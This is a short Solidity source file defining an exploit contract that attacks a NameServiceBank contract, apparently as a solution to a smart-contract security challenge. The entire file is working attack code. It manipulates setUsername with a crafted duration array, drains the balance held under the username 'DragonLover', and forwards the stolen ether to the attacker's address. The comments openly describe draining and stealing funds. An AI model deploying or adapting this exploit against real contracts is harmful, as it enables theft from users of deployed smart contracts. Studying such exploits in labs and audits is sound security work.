pragma solidity 0.7.0;

import "../NameServiceBank.sol";

contract AttackContract {
    NAME_SERVICE_BANK public targetBank;
    address public attacker;

    constructor(address _targetBank) {
        targetBank = NAME_SERVICE_BANK(_targetBank);
        attacker = msg.sender;
    }

    function exploit() external payable {
        // Step 1: Prepare attack parameters
        uint256[2] memory duration = [block.timestamp + 100, block.timestamp];
        
        // Step 2: Set the original username without obfuscation
        targetBank.setUsername{value: 1 ether}("DragonLover", 5, duration);
        
        // Step 3: Drain the funds from the original username
        uint256 balance = targetBank.balanceOf(targetBank.addressOf("DragonLover"));
        targetBank.withdraw(balance);
        
        // Step 4: Send stolen funds to attacker
        (bool success, ) = payable(attacker).call{value: address(this).balance}("");
        require(success, "Transfer to attacker failed");
    }

    receive() external payable {}
}